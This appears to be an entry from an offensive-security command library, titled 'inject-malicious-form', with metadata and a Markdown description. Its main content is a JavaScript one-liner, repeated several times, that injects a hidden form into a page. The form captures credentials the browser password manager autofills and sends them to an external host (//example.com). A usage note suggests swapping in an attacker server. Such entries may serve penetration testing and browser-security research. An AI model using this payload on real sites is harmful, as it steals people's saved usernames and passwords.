---
data: >-
  document.getElementsByTagName("div")[0].innerHTML=`<form
  action="//example.com"><input hidden name=user><input hidden type=password
  name=password><input type=submit></form>`
tags:
  - credential-theft
  - form-injection
type: command
output: 'Form appears; on submit, autofilled credentials sent to //example.com'
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.577Z'
id: 83e9bfeb-3880-41aa-9013-8ac62dc9e110
verified: false
validated: true
submitted: true
---
# inject-malicious-form

## Command

```javascript
document.getElementsByTagName("div")[0].innerHTML=`<form action="//example.com"><input hidden name=user><input hidden type=password name=password><input type=submit></form>`
```

## Description

Injects a hidden form via console that submits to an external domain, capturing autofilled credentials from browser password manager due to permissive CSP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| innerHTML | Form HTML with action to external domain and hidden user/password inputs | Yes |
| action | External URL (//example.com) | Yes |

## Examples

### Basic Usage

```javascript
document.getElementsByTagName("div")[0].innerHTML=`<form action="//example.com"><input hidden name=user><input hidden type=password name=password><input type=submit></form>`
```

### Advanced Usage

Add more fields or change action to attacker server; ensure saved credentials exist.

## Expected Output

Form injected; clicking submit autofills and POSTs credentials to external domain, visible in Network tab.

## Related

- [[procedures/Inject-Form-for-Credential-Submission]]
- [[tools/Chrome-Password-Manager]]
